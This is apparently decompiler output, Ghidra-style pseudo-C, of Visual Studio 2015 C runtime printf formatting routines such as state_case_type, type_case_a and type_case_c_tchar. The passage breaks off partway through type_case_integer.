output_processor<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>,class___crt_stdio_output::standard_base<wchar_t,class___crt_stdio_output::string_output_adapter<wchar_t>_>_>
::state_case_type(output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
                  *this)

{
  int *piVar1;
  short sVar2;
  bool bVar3;
  bool bVar4;
  char cVar5;
  undefined uVar6;
  undefined4 uVar7;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined extraout_DL_01;
  undefined extraout_DL_02;
  undefined extraout_DL_03;
  undefined extraout_DL_04;
  undefined extraout_DL_05;
  undefined extraout_DL_06;
  undefined extraout_DL_07;
  undefined extraout_DL_08;
  int iVar8;
  int iVar9;
  ushort uVar10;
  uint uVar11;
  uint uStack16;
  short asStack14 [3];
  uint local_8;
  
  local_8 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar6 = 0x41;
  uVar10 = *(ushort *)(this + 0x32);
  if (uVar10 < 0x65) {
    if (uVar10 == 100) {
LAB_00405f1b:
      *(uint *)(this + 0x20) = *(uint *)(this + 0x20) | 0x10;
LAB_00405f1f:
      cVar5 = '\0';
      uVar11 = 10;
LAB_00405f22:
      uVar11 = type_case_integer(this,uVar11,cVar5);
      cVar5 = (char)uVar11;
      uVar6 = extraout_DL_04;
    }
    else if (uVar10 < 0x59) {
      if (uVar10 == 0x58) {
        cVar5 = '\x01';
LAB_00405ec7:
        uVar11 = 0x10;
        goto LAB_00405f22;
      }
      if (uVar10 != 0x41) {
        if (uVar10 == 0x43) goto LAB_00405edb;
        if (uVar10 < 0x45) goto LAB_004060a9;
        if (0x47 < uVar10) {
          if (uVar10 != 0x53) goto LAB_004060a9;
          goto LAB_00405eaf;
        }
      }
LAB_00405f2b:
      uVar7 = type_case_a((uint *)this);
      cVar5 = (char)uVar7;
      uVar6 = extraout_DL_05;
    }
    else if (uVar10 == 0x5a) {
      uVar7 = type_case_Z((__uint64 *)this);
      cVar5 = (char)uVar7;
      uVar6 = extraout_DL_01;
    }
    else {
      if (uVar10 == 0x61) goto LAB_00405f2b;
      if (uVar10 != 99) goto LAB_004060a9;
LAB_00405edb:
      uVar7 = type_case_c_tchar((__uint64 *)this);
      cVar5 = (char)uVar7;
      uVar6 = extraout_DL_00;
    }
  }
  else if (uVar10 < 0x71) {
    if (uVar10 == 0x70) {
      cVar5 = type_case_p(this);
      uVar6 = extraout_DL_06;
    }
    else {
      if (uVar10 < 0x68) goto LAB_00405f2b;
      if (uVar10 == 0x69) goto LAB_00405f1b;
      if (uVar10 == 0x6e) {
        uVar11 = type_case_n((int)this);
        cVar5 = (char)uVar11;
        uVar6 = extraout_DL_03;
      }
      else {
        if (uVar10 != 0x6f) goto LAB_004060a9;
        cVar5 = type_case_o(this);
        uVar6 = extraout_DL_02;
      }
    }
  }
  else {
    if (uVar10 != 0x73) {
      if (uVar10 != 0x75) {
        if (uVar10 != 0x78) goto LAB_004060a9;
        cVar5 = '\0';
        goto LAB_00405ec7;
      }
      goto LAB_00405f1f;
    }
LAB_00405eaf:
    uVar7 = type_case_s((__uint64 *)this);
    cVar5 = (char)uVar7;
    uVar6 = extraout_DL;
  }
  if ((cVar5 == '\0') ||
     (this[0x30] !=
      (output_processor_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t__class___crt_stdio_output__standard_base_wchar_t_class___crt_stdio_output__string_output_adapter_wchar_t_____
       )0x0)) goto LAB_004060a9;
  uVar11 = *(uint *)(this + 0x20);
  uStack16 = 0;
  asStack14[1] = 0;
  iVar8 = 0;
  if ((uVar11 >> 4 & 1) != 0) {
    if ((uVar11 >> 6 & 1) == 0) {
      if ((uVar11 & 1) == 0) {
        if ((uVar11 >> 1 & 1) != 0) {
          uStack16 = 0x20;
          iVar8 = 1;
        }
        goto LAB_00405fa9;
      }
      uVar10 = 0x2b;
    }
    else {
      uVar10 = 0x2d;
    }
    uStack16 = (uint)uVar10;
    iVar8 = 1;
  }
LAB_00405fa9:
  sVar2 = *(short *)(this + 0x32);
  if (((sVar2 == 0x78) || (sVar2 == 0x58)) && ((uVar11 >> 5 & 1) != 0)) {
    bVar3 = true;
  }
  else {
    bVar3 = false;
  }
  if ((sVar2 == 0x61) || (sVar2 == 0x41)) {
    bVar4 = true;
  }
  else {
    bVar4 = false;
  }
  if ((bVar3) || (bVar4)) {
    *(undefined2 *)(&stack0xfffffff0 + iVar8 * 2) = 0x30;
    if ((sVar2 == 0x58) || (sVar2 == 0x41)) {
      bVar3 = true;
    }
    else {
      bVar3 = false;
    }
    asStack14[iVar8] = (short)(char)((!bVar3 - 1U & 0xe0) + 0x78);
    iVar8 = iVar8 + 2;
  }
  iVar9 = (*(int *)(this + 0x24) - *(int *)(this + 0x38)) - iVar8;
  if ((uVar11 & 0xc) == 0) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_wchar_t__char_
              ((string_output_adapter_wchar_t_ *)(this + 0x448),' ',iVar9,(int *)(this + 0x18));
  }
  string_output_adapter<wchar_t>::write_string
            ((string_output_adapter_wchar_t_ *)(this + 0x448),(wchar_t *)&stack0xfffffff0,iVar8,
             (int *)(this + 0x18),*(int **)(this + 0xc));
  piVar1 = (int *)(this + 0x18);
  if (((*(uint *)(this + 0x20) >> 3 & 1) != 0) && ((*(uint *)(this + 0x20) >> 2 & 1) == 0)) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_wchar_t__char_
              ((string_output_adapter_wchar_t_ *)(this + 0x448),'0',iVar9,piVar1);
  }
  write_stored_string_tchar((uint)this);
  uVar6 = extraout_DL_07;
  if ((-1 < *piVar1) && ((*(uint *)(this + 0x20) >> 2 & 1) != 0)) {
    write_multiple_characters_class___crt_stdio_output__string_output_adapter_wchar_t__char_
              ((string_output_adapter_wchar_t_ *)(this + 0x448),' ',iVar9,piVar1);
    uVar6 = extraout_DL_08;
  }
LAB_004060a9:
  uVar6 = FUN_0040296a(local_8 ^ (uint)&stack0xfffffffc,uVar6,SUB41(uStack16,0));
  return (bool)uVar6;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::state_case_width(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::string_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::string_output_adapter<char>>>::state_case_width(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_width(void *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(char *)((int)param_1 + 0x31) != '*') {
    uVar2 = parse_int_from_format_string(param_1,(long *)((int)param_1 + 0x24));
    return uVar2;
  }
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x24) = iVar1;
  if (iVar1 < 0) {
    *(uint *)((int)param_1 + 0x20) = *(uint *)((int)param_1 + 0x20) | 4;
    *(int *)((int)param_1 + 0x24) = -*(int *)((int)param_1 + 0x24);
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::state_case_width(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::string_output_adapter<wchar_t>>>::state_case_width(void)
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall state_case_width(void *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(short *)((int)param_1 + 0x32) != 0x2a) {
    uVar2 = parse_int_from_format_string(param_1,(long *)((int)param_1 + 0x24));
    return uVar2;
  }
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  iVar1 = *(int *)(*(int *)((int)param_1 + 0x14) + -4);
  *(int *)((int)param_1 + 0x24) = iVar1;
  if (iVar1 < 0) {
    *(uint *)((int)param_1 + 0x20) = *(uint *)((int)param_1 + 0x20) | 4;
    *(int *)((int)param_1 + 0x24) = -*(int *)((int)param_1 + 0x24);
  }
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



// Library Function - Single Match
//  unsigned int __cdecl __crt_stdio_output::to_integer_size(enum
// __crt_stdio_output::length_modifier)
// 
// Library: Visual Studio 2015 Release

uint __cdecl __crt_stdio_output::to_integer_size(length_modifier param_1)

{
  uint uStack8;
  
  switch(param_1) {
  case 0:
  case 3:
  case 6:
  case 7:
  case 9:
  case 10:
    uStack8 = 4;
    break;
  case 1:
    return 1;
  case 2:
    uStack8 = 2;
    break;
  case 4:
  case 5:
  case 0xb:
    uStack8 = 8;
    break;
  default:
    return 0;
  }
  return uStack8;
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_Z(void)
//   6 names - too many to list
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

undefined4 __fastcall type_case_Z(__uint64 *param_1)

{
  ushort *puVar1;
  int iVar2;
  bool bVar3;
  uint uVar4;
  
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  uVar4 = *(uint *)((int)param_1 + 0x14);
  puVar1 = *(ushort **)(uVar4 - 4);
  if ((puVar1 == (ushort *)0x0) || (iVar2 = *(int *)(puVar1 + 2), iVar2 == 0)) {
    *(char **)((int)param_1 + 0x34) = "(null)";
    *(undefined4 *)(param_1 + 7) = 6;
  }
  else {
    bVar3 = __crt_stdio_output::is_wide_character_specifier_char_
                      (*param_1,*(char *)((int)param_1 + 0x31),
                       *(length_modifier *)((int)param_1 + 0x2c));
    *(int *)((int)param_1 + 0x34) = iVar2;
    uVar4 = (uint)*puVar1;
    if (bVar3) {
      uVar4 = (uint)(*puVar1 >> 1);
      *(uint *)(param_1 + 7) = uVar4;
      *(undefined *)((int)param_1 + 0x3c) = 1;
      goto LAB_004061c9;
    }
    *(uint *)(param_1 + 7) = uVar4;
  }
  *(undefined *)((int)param_1 + 0x3c) = 0;
LAB_004061c9:
  return CONCAT31((int3)(uVar4 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_Z(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_Z(void)
//   6 names - too many to list
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

undefined4 __fastcall type_case_Z(__uint64 *param_1)

{
  ushort *puVar1;
  int iVar2;
  bool bVar3;
  uint uVar4;
  
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  uVar4 = *(uint *)((int)param_1 + 0x14);
  puVar1 = *(ushort **)(uVar4 - 4);
  if ((puVar1 == (ushort *)0x0) || (iVar2 = *(int *)(puVar1 + 2), iVar2 == 0)) {
    *(char **)((int)param_1 + 0x34) = "(null)";
    *(undefined4 *)(param_1 + 7) = 6;
  }
  else {
    bVar3 = __crt_stdio_output::is_wide_character_specifier_wchar_t_
                      (*param_1,SUB21(*(undefined2 *)((int)param_1 + 0x32),0),
                       *(length_modifier *)((int)param_1 + 0x2c));
    *(int *)((int)param_1 + 0x34) = iVar2;
    uVar4 = (uint)*puVar1;
    if (bVar3) {
      uVar4 = (uint)(*puVar1 >> 1);
      *(uint *)(param_1 + 7) = uVar4;
      *(undefined *)((int)param_1 + 0x3c) = 1;
      goto LAB_0040622c;
    }
    *(uint *)(param_1 + 7) = uVar4;
  }
  *(undefined *)((int)param_1 + 0x3c) = 0;
LAB_0040622c:
  return CONCAT31((int3)(uVar4 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_a(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_a(uint *param_1)

{
  uint *this;
  char *pcVar1;
  char cVar2;
  bool bVar3;
  uint uVar4;
  uint *puVar5;
  int iVar6;
  char *pcVar7;
  uint uVar8;
  char *pcVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  __crt_locale_pointers *p_Var13;
  uint *local_c;
  uint *local_8;
  
  param_1[8] = param_1[8] | 0x10;
  if ((int)param_1[10] < 0) {
    if ((*(char *)((int)param_1 + 0x31) == 'a') || (*(char *)((int)param_1 + 0x31) == 'A')) {
      param_1[10] = 0xd;
    }
    else {
      param_1[10] = 6;
    }
  }
  else if ((param_1[10] == 0) &&
          ((*(char *)((int)param_1 + 0x31) == 'g' || (*(char *)((int)param_1 + 0x31) == 'G')))) {
    param_1[10] = 1;
  }
  this = param_1 + 0x10;
  local_c = param_1;
  local_8 = param_1;
  bVar3 = __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough_char_
                    ((formatting_buffer *)this,param_1[10] + 0x15d);
  if (!bVar3) {
    uVar4 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
    param_1[10] = uVar4 - 0x15d;
  }
  puVar5 = (uint *)param_1[0x111];
  if ((uint *)param_1[0x111] == (uint *)0x0) {
    puVar5 = this;
  }
  param_1[0xd] = (uint)puVar5;
  param_1[5] = param_1[5] + 8;
  local_c = *(uint **)(param_1[5] - 8);
  local_8 = *(uint **)(param_1[5] - 4);
  uVar4 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
  puVar5 = (uint *)param_1[0x111];
  if ((uint *)param_1[0x111] == (uint *)0x0) {
    puVar5 = this;
  }
  p_Var13 = (__crt_locale_pointers *)param_1[2];
  iVar6 = (int)*(char *)((int)param_1 + 0x31);
  uVar12 = param_1[1];
  uVar11 = *param_1;
  uVar10 = param_1[10];
  pcVar7 = __crt_stdio_output::formatting_buffer::scratch_data_char_((formatting_buffer *)this);
  uVar8 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
  ___acrt_fp_format((double *)&local_c,(char *)puVar5,uVar8,pcVar7,uVar4,iVar6,uVar10,uVar11,uVar12,
                    p_Var13);
  if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {
    __crt_stdio_output::force_decimal_point
              ((char *)param_1[0xd],(__crt_locale_pointers *)param_1[2]);
  }
  if (((*(char *)((int)param_1 + 0x31) == 'g') || (*(char *)((int)param_1 + 0x31) == 'G')) &&
     ((param_1[8] >> 5 & 1) == 0)) {
    __crt_stdio_output::crop_zeroes((char *)param_1[0xd],(__crt_locale_pointers *)param_1[2]);
  }
  pcVar7 = (char *)param_1[0xd];
  if (*pcVar7 == '-') {
    param_1[8] = param_1[8] | 0x40;
    pcVar7 = pcVar7 + 1;
    param_1[0xd] = (uint)pcVar7;
  }
  pcVar9 = (char *)param_1[0xd];
  cVar2 = *pcVar9;
  if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {
    *(undefined *)((int)param_1 + 0x31) = 0x73;
  }
  pcVar1 = pcVar9 + 1;
  do {
    cVar2 = *pcVar9;
    pcVar9 = pcVar9 + 1;
  } while (cVar2 != '\0');
  param_1[0xe] = (int)pcVar9 - (int)pcVar1;
  return CONCAT31((int3)((uint)pcVar7 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_a(void)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_a(void)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_a(uint *param_1)

{
  uint *this;
  char cVar1;
  bool bVar2;
  uint uVar3;
  uint *puVar4;
  int iVar5;
  char *pcVar6;
  uint uVar7;
  char *pcVar8;
  uint uVar9;
  uint uVar10;
  uint uVar11;
  __crt_locale_pointers *p_Var12;
  uint *local_c;
  uint *local_8;
  
  param_1[8] = param_1[8] | 0x10;
  if ((int)param_1[10] < 0) {
    if ((*(short *)((int)param_1 + 0x32) == 0x61) || (*(short *)((int)param_1 + 0x32) == 0x41)) {
      param_1[10] = 0xd;
    }
    else {
      param_1[10] = 6;
    }
  }
  else if ((param_1[10] == 0) &&
          ((*(short *)((int)param_1 + 0x32) == 0x67 || (*(short *)((int)param_1 + 0x32) == 0x47))))
  {
    param_1[10] = 1;
  }
  this = param_1 + 0x10;
  local_c = param_1;
  local_8 = param_1;
  bVar2 = __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough_char_
                    ((formatting_buffer *)this,param_1[10] + 0x15d);
  if (!bVar2) {
    uVar3 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
    param_1[10] = uVar3 - 0x15d;
  }
  puVar4 = (uint *)param_1[0x111];
  if ((uint *)param_1[0x111] == (uint *)0x0) {
    puVar4 = this;
  }
  param_1[0xd] = (uint)puVar4;
  param_1[5] = param_1[5] + 8;
  local_c = *(uint **)(param_1[5] - 8);
  local_8 = *(uint **)(param_1[5] - 4);
  uVar3 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
  puVar4 = (uint *)param_1[0x111];
  if ((uint *)param_1[0x111] == (uint *)0x0) {
    puVar4 = this;
  }
  p_Var12 = (__crt_locale_pointers *)param_1[2];
  iVar5 = (int)*(char *)((int)param_1 + 0x32);
  uVar11 = param_1[1];
  uVar10 = *param_1;
  uVar9 = param_1[10];
  pcVar6 = __crt_stdio_output::formatting_buffer::scratch_data_char_((formatting_buffer *)this);
  uVar7 = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
  ___acrt_fp_format((double *)&local_c,(char *)puVar4,uVar7,pcVar6,uVar3,iVar5,uVar9,uVar10,uVar11,
                    p_Var12);
  if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {
    __crt_stdio_output::force_decimal_point
              ((char *)param_1[0xd],(__crt_locale_pointers *)param_1[2]);
  }
  if (((*(short *)((int)param_1 + 0x32) == 0x67) || (*(short *)((int)param_1 + 0x32) == 0x47)) &&
     ((param_1[8] >> 5 & 1) == 0)) {
    __crt_stdio_output::crop_zeroes((char *)param_1[0xd],(__crt_locale_pointers *)param_1[2]);
  }
  pcVar6 = (char *)param_1[0xd];
  if (*pcVar6 == '-') {
    param_1[8] = param_1[8] | 0x40;
    pcVar6 = pcVar6 + 1;
    param_1[0xd] = (uint)pcVar6;
  }
  pcVar8 = (char *)param_1[0xd];
  cVar1 = *pcVar8;
  uVar3 = (uint)pcVar6 & 0xffffff00;
  if (((cVar1 == 'i') || (cVar1 == 'I')) || ((cVar1 == 'n' || (cVar1 == 'N')))) {
    uVar3 = 0;
    *(undefined2 *)((int)param_1 + 0x32) = 0x73;
  }
  pcVar6 = pcVar8 + 1;
  do {
    cVar1 = *pcVar8;
    pcVar8 = pcVar8 + 1;
  } while (cVar1 != '\0');
  param_1[0xe] = (int)pcVar8 - (int)pcVar6;
  return CONCAT31((int3)(uVar3 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_c_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::console_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::console_output_adapter<char>>>::type_case_c_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::format_validation_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_c_tchar(char)
//  private: bool __thiscall __crt_stdio_output::output_processor<char,class
// __crt_stdio_output::stream_output_adapter<char>,class
// __crt_stdio_output::standard_base<char,class
// __crt_stdio_output::stream_output_adapter<char>>>::type_case_c_tchar(char)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_c_tchar(__uint64 *param_1)

{
  bool bVar1;
  uint _SizeInBytes;
  errno_t eVar2;
  __uint64 *p_Var3;
  __uint64 *this;
  wchar_t _WCh;
  
  bVar1 = __crt_stdio_output::is_wide_character_specifier_char_
                    (*param_1,*(char *)((int)param_1 + 0x31),
                     *(length_modifier *)((int)param_1 + 0x2c));
  this = param_1 + 8;
  if (bVar1) {
    *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
    _WCh = *(wchar_t *)(*(int *)((int)param_1 + 0x14) + -4);
    p_Var3 = *(__uint64 **)((int)param_1 + 0x444);
    if (*(__uint64 **)((int)param_1 + 0x444) == (__uint64 *)0x0) {
      p_Var3 = this;
    }
    _SizeInBytes = __crt_stdio_output::formatting_buffer::count_char_((formatting_buffer *)this);
    eVar2 = _wctomb_s((int *)(param_1 + 7),(char *)p_Var3,_SizeInBytes,_WCh);
    if (eVar2 != 0) {
      *(undefined *)(param_1 + 6) = 1;
    }
  }
  else {
    p_Var3 = *(__uint64 **)((int)param_1 + 0x444);
    if (*(__uint64 **)((int)param_1 + 0x444) == (__uint64 *)0x0) {
      p_Var3 = this;
    }
    *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
    *(formatting_buffer *)p_Var3 = *(formatting_buffer *)(*(int *)((int)param_1 + 0x14) + -4);
    *(undefined4 *)(param_1 + 7) = 1;
  }
  p_Var3 = *(__uint64 **)((int)param_1 + 0x444);
  if (p_Var3 != (__uint64 *)0x0) {
    this = p_Var3;
  }
  *(__uint64 **)((int)param_1 + 0x34) = this;
  return CONCAT31((int3)((uint)p_Var3 >> 8),1);
}



// WARNING: Could not reconcile some variable overlaps
// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_c_tchar(wchar_t)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_c_tchar(wchar_t)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_c_tchar(wchar_t)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_c_tchar(wchar_t)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

undefined4 __fastcall type_case_c_tchar(__uint64 *param_1)

{
  ushort uVar1;
  bool bVar2;
  int iVar3;
  __uint64 *p_Var4;
  __uint64 *p_Var5;
  __uint64 *local_8;
  
  *(undefined *)((int)param_1 + 0x3c) = 1;
  *(int *)((int)param_1 + 0x14) = *(int *)((int)param_1 + 0x14) + 4;
  uVar1 = *(ushort *)(*(int *)((int)param_1 + 0x14) + -4);
  local_8 = param_1;
  bVar2 = __crt_stdio_output::is_wide_character_specifier_wchar_t_
                    (*param_1,SUB21(*(undefined2 *)((int)param_1 + 0x32),0),
                     *(length_modifier *)((int)param_1 + 0x2c));
  p_Var5 = param_1 + 8;
  if (bVar2) {
    p_Var4 = *(__uint64 **)((int)param_1 + 0x444);
    if (*(__uint64 **)((int)param_1 + 0x444) == (__uint64 *)0x0) {
      p_Var4 = p_Var5;
    }
    *(ushort *)p_Var4 = uVar1;
  }
  else {
    local_8._0_2_ = uVar1 & 0xff | (ushort)bVar2 << 8;
    local_8 = (__uint64 *)((uint)local_8 & 0xffff0000 | (uint)(ushort)local_8);
    p_Var4 = *(__uint64 **)((int)param_1 + 0x444);
    if (*(__uint64 **)((int)param_1 + 0x444) == (__uint64 *)0x0) {
      p_Var4 = p_Var5;
    }
    iVar3 = __mbtowc_l((wchar_t *)p_Var4,(char *)&local_8,
                       (*(_locale_t *)(param_1 + 1))->locinfo->lc_codepage,
                       *(_locale_t *)(param_1 + 1));
    if (iVar3 < 0) {
      *(undefined *)(param_1 + 6) = 1;
    }
  }
  p_Var4 = *(__uint64 **)((int)param_1 + 0x444);
  if (p_Var4 != (__uint64 *)0x0) {
    p_Var5 = p_Var4;
  }
  *(__uint64 **)((int)param_1 + 0x34) = p_Var5;
  *(undefined4 *)(param_1 + 7) = 1;
  return CONCAT31((int3)((uint)p_Var4 >> 8),1);
}



// Library Function - Multiple Matches With Same Base Name
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_integer(unsigned int,bool)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::console_output_adapter<wchar_t>>>::type_case_integer(unsigned int,bool)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::format_validation_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_integer(unsigned int,bool)
//  private: bool __thiscall __crt_stdio_output::output_processor<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>,class
// __crt_stdio_output::standard_base<wchar_t,class
// __crt_stdio_output::stream_output_adapter<wchar_t>>>::type_case_integer(unsigned int,bool)
//   6 names - too many to list
// 
// Library: Visual Studio 2015 Release

uint __thiscall type_case_integer(void *this,uint param_1,char param_2)

{
  uint uVar1;
  int *piVar2;
  char *pcVar3;
  uint uVar4;
  uint uVar5;
  bool bVar6;
  
  uVar1 = __crt_stdio_output::to_integer_size(*(length_modifier *)((int)this + 0x2c));
